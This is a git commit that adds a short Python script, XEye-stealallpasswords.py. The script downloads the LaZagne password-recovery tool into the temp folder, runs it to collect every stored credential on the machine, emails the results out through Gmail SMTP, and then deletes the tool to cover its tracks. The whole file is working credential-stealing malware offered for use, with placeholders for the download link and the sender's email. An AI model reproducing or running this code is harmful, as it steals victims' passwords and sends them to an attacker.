d823ed66f1d9ee1fd46261a51dc225edbab1b676
Mostafa Ahmad <53053339+Engmostafa26@users.noreply.github.com>
2022-10-06 18:51:07 +0200

    Create XEye-stealallpasswords.py

---
+++ XEye-stealallpasswords.py
@@ -0,0 +1,21 @@
+import smtplib,os,tempfile,subprocess,requests
+
+def smail(email, password, message):
+    smtps = smtplib.SMTP("smtp.gmail.com", 587)
+    smtps.starttls()
+    smtps.login(email, password)
+    smtps.sendmail(email,email,message)
+    smtps.quit()
+def murl(url):
+    filen = url.split("/")[-1]
+    respo = requests.get(url)
+    with open(filen,"wb") as outfile:
+        outfile.write(respo.content)
+
+tempf = tempfile.gettempdir()
+os.chdir(tempf)
+murl("Enter the link to lazagne file here")
+cmd = "lazagne all"
+result = subprocess.check_output(cmd)
+smail("Enter your email", "Enter your password", result)
+os.remove("lazagne.exe")
